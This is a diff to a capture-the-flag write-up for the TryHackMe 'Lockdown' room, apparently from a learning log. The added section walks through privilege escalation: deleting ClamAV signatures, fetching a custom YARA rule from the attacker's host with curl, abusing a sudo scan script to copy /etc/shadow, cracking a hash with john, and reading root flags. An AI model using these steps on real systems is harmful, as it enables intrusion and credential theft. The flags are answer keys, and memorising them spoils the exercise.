@@ -1,9 +1,12 @@
-<p>July 12, 2025 - Day 432</p>
+<p>July 12, 2025 - Day 433</p>
 <h1>Lockdown</h1>
 <p>Stay at 127.0.0.1. Wear a 255.255.255.0.<br>
 https://tryhackme.com/room/lockdown</p>
 
 <img width="1920" height="172" alt="image" src="https://github.com/user-attachments/assets/aeaeb9d1-1161-4052-9b74-89af6ce714a1" />
+
+<img width="1898" height="381" alt="image" src="https://github.com/user-attachments/assets/b143c742-5b58-47b5-9aaf-a0b326d7691f" />
+
 
 
 <br>
@@ -205,7 +208,6 @@ www-data@ip-xx-xx-xxx-xxx::$ ls /home
 cyrus  maxine  ssm-user  ubuntu
 ```
 
-
 ```bash
 www-data@ip-xx-xx-xxx-xxx::/var/www/html$ ls
 404.html   build       cts_qr_card.png	inc	   login.php  uploads
@@ -319,8 +321,18 @@ THM{w4c1F5AuUNhHCJRtiGtRqZyp0QJDIbWS}
 
 <br>
 
+
 ```bash
-cyrus@ip-xx-xx-xxx-xxx::~$ sudo -l
+cyrus@ip-xx-xx-xxx-xxx:~$ cat .bash_history
+sudo /opt/scan/scan.sh
+cd /var/lib/clamav/
+ll
+exit
+exit
+```
+
+```bash
+cyrus@ip-xx-xx-xxx-xxx:~$ sudo -l
 [sudo] password for cyrus: 
 Matching Defaults entries for cyrus on ip-xx-xx-xxx-xxx:
     env_reset, mail_badpass,
@@ -362,20 +374,124 @@ drwxr-xr-x  3 clamav clamav      4096 Jul 13
 ```bash
 cyrus@ip-xx-xx-xxx-xxx:/var/lib/clamav$ rm main.hdb
 rm: remove write-protected regular file 'main.hdb'? yes
-cyrus@ip-xx-xx-xxx-xxx: curl http://AttackIP:8000/shadow.yar -o shadow.yar               
-rule root
+cyrus@ip-10-10-70-255:/var/lib/clamav$ ls -la
+total 367628
+drwxrwxrwx  3 clamav clamav      4096 Jul 13 02:41 .
+drwxr-xr-x 52 root   root        4096 Jul  5 14:12 ..
+-rw-r--r--  1 clamav clamav    284179 Jul  5 14:03 bytecode.cvd
+-rw-r--r--  1 clamav clamav 205647360 Jul 10 18:31 daily.cld
+-rw-r--r--  1 clamav clamav        69 Apr 26 23:18 freshclam.dat
+-rw-r--r--  1 clamav clamav 170479789 Jul  5 14:03 main.cvd
+-rw-r--r--  1 root   root          69 May 11  2021 mirrors.dat
+drwxr-xr-x  3 clamav clamav      4096 Jul 13 02:41 tmp.da73861dcc
+<lib/clamav$ curl http://10.10.81.149:8000/root.yar -o root.yar              
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100    96  100    96    0     0  32000      0 --:--:-- --:--:-- --:--:-- 48000
+cyrus@ip-10-10-70-255:/var/lib/clamav$ cat root.yar
+rule CheckFileName
 {
- strings:
-  $s = "root"
- condition:
-  $s
+  strings:
+    $a = "root"
+    $b = "THM"
+    
+  condition:
+    $a or $b
 }
+cyrus@ip-10-10-70-255:/var/lib/clamav$ sudo /opt/scan/scan.sh
+Enter path: /root
+
 ```
 
 ```bash
 cyrus@ip-xx-xx-xxx-xxx:/var/lib/clamav$ sudo /opt/scan/scan.sh
 Enter path: /etc/shadow
-
-
-
 ```
+
+```bash
+cyrus@ip-10-10-70-255:/var/lib/clamav$ sudo /opt/scan/scan.sh
+Enter path: /root/root.txt
+^C
+```
+
+```bash
+cyrus@lockdown:/var/lib/clamav$ cat /home/cyrus/quarantine/shadow
+cat /home/cyrus/quarantine/shadow
+root:*:18480:0:99999:7:::
+daemon:*:18480:0:99999:7:::
+bin:*:18480:0:99999:7:::
+sys:*:18480:0:99999:7:::
+sync:*:18480:0:99999:7:::
+games:*:18480:0:99999:7:::
+man:*:18480:0:99999:7:::
+lp:*:18480:0:99999:7:::
+mail:*:18480:0:99999:7:::
+news:*:18480:0:99999:7:::
+uucp:*:18480:0:99999:7:::
+proxy:*:18480:0:99999:7:::
+www-data:*:18480:0:99999:7:::
+backup:*:18480:0:99999:7:::
+list:*:18480:0:99999:7:::
+irc:*:18480:0:99999:7:::
+gnats:*:18480:0:99999:7:::
+nobody:*:18480:0:99999:7:::
+systemd-network:*:18480:0:99999:7:::
+systemd-resolve:*:18480:0:99999:7:::
+syslog:*:18480:0:99999:7:::
+messagebus:*:18480:0:99999:7:::
+_apt:*:18480:0:99999:7:::
+lxd:*:18480:0:99999:7:::
+uuidd:*:18480:0:99999:7:::
+dnsmasq:*:18480:0:99999:7:::
+landscape:*:18480:0:99999:7:::
+pollinate:*:18480:0:99999:7:::
+sshd:*:18757:0:99999:7:::
+maxine:$6$/syu6s6/$Z5j6C61vrwzvXmFsvMRzwNYHO71NSQgm/z4cWQpDxMt3JEpT9FvnWm4Nuy.xE3xCQHzY3q9Q4lxXLJyR1mt320:18838:0:99999:7:::
+cyrus:$6$YWzR.V19JxyENT/D$KuSzWbb6V0iXfIcA/88Buum92Fr5lBu6r.kMoQYAdfvbJuHjO7i7wodoahlZAYfFhIuymOaEWxGlo0WkhbqaI1:18757:0:99999:7:::
+mysql:!:18758:0:99999:7:::
+clamav:!:18758:0:99999:7:::
+```
+
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt maxine_hash
+```
+
+```bash
+cyrus@ip-10-10-70-255:/var/lib/clamav$ su maxine
+Password: 
+maxine@ip-10-10-70-255:/var/lib/clamav$ sudo -l
+[sudo] password for maxine: 
+Matching Defaults entries for maxine on ip-10-10-70-255:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User maxine may run the following commands on ip-10-10-70-255:
+    (ALL : ALL) ALL
+maxine@ip-10-10-70-255:/var/lib/clamav$ sudo su
+root@ip-10-10-70-255:/var/lib/clamav# cd /root
+root@ip-10-10-70-255:~# ls 
+root.txt
+root@ip-10-10-70-255:~# cat root.txt
+THM{IQ23Em4VGX91cvxsIzatpUvrW9GZZJxm}
+root@ip-10-10-70-255:~# 
+```
+
+<br>
+<br>
+
+<img width="1898" height="895" alt="image" src="https://github.com/user-attachments/assets/477ca1d6-2637-40b4-bb4d-e23b5db52f8d" />
+
+<img width="1906" height="892" alt="image" src="https://github.com/user-attachments/assets/17e72e94-ac0f-4938-b105-da11ea7a33fa" />
+
+
+<br>
+
+<img width="421" height="280" alt="image" src="https://github.com/user-attachments/assets/8bc94891-3de3-4da2-9349-3136a80654f2" />
+
+<img width="1897" height="890" alt="image" src="https://github.com/user-attachments/assets/d136e042-f45c-458f-bd8f-c73c6919ce3f" />
+
+<img width="1893" height="891" alt="image" src="https://github.com/user-attachments/assets/30dd403c-771d-430c-b228-ff31d440d38f" />
+
+<img width="1889" height="899" alt="image" src="https://github.com/user-attachments/assets/4c5645fd-f7bd-48b2-a0f9-ff291d96030c" />
+
+<img width="1893" height="892" alt="image" src="https://github.com/user-attachments/assets/ce46b99f-370e-498b-9ed2-3abdf2419757" />
